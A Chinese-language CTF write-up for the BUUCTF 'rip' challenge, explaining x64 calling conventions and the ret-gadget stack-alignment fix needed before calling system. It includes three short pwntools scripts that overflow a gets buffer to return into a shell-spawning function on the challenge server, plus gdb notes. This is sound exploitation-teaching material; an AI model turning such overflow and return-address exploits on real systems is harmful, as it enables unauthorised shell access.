主要讲讲学到的关于x64位程序pwn与x32位的区别

  • 调用system时利用ret栈对齐

  • x64用rdi,rsi,rdx,rcx,r8,r9作为第1-6个参数，rax作为返回值，传参需要找到pop rdi;ret这样的gadgets

参考文章：

在一些64位的glibc的payload调用system函数失败问题

32位和64位在pwn中的不同点

一步一步学ROP之linux_x64篇

首先是一道看起来很简单的题：
rip(BUUCTF)
首先检查防护，全都没开

尝试运行，大概逻辑是将输入输出，再输出一行ok.bye!!!

用IDA打开，查看汇编代码是gets读入再puts输出，gets可利用。

在fun函数中发现system(“/bin/sh”)。

很简单，通过rop到fun函数即可。

根据上述分析写exp如下：

from pwn import *
io = remote('node3.buuoj.cn',29074)

payload = 'a'*(0x0F+0x08) +p64(0x0401186)
io.send(payload)
io.interactive()

但是却出现了如下问题，程序直接停止

查看资料发现是64位程序system的问题

尝试的解决办法有两种，一是加ret(直接在二进制文件里找即可)

from pwn import *
io = remote('node3.buuoj.cn',29074)

ret = 0x0401185
payload = 'a'*(0x0F+0x08)+p64(ret) +p64(0x0401186)
io.send(payload)
io.interactive()

或者改变返回的位置

from pwn import *
io = remote('node3.buuoj.cn',29074)

payload = 'a'*(0x0F+0x08)+p64(0x0401186+1)
io.send(payload)
io.interactive()

进一步通过gdb分析：

不加ret时

从$2可以看出，确实是由于没有栈对齐导致

再看加了ret之后：

发现在这一步之后，程序没有和之前一样执行:movaps XMMWORD PTR [rsp+0x40],xmme, （此时$rsp+0x40其实是对齐的），返回地址+1方法调试时也是如此。结合调试时system之前的几步猜测可能是因为栈没对齐才会多运行do_system+1094这一行？？
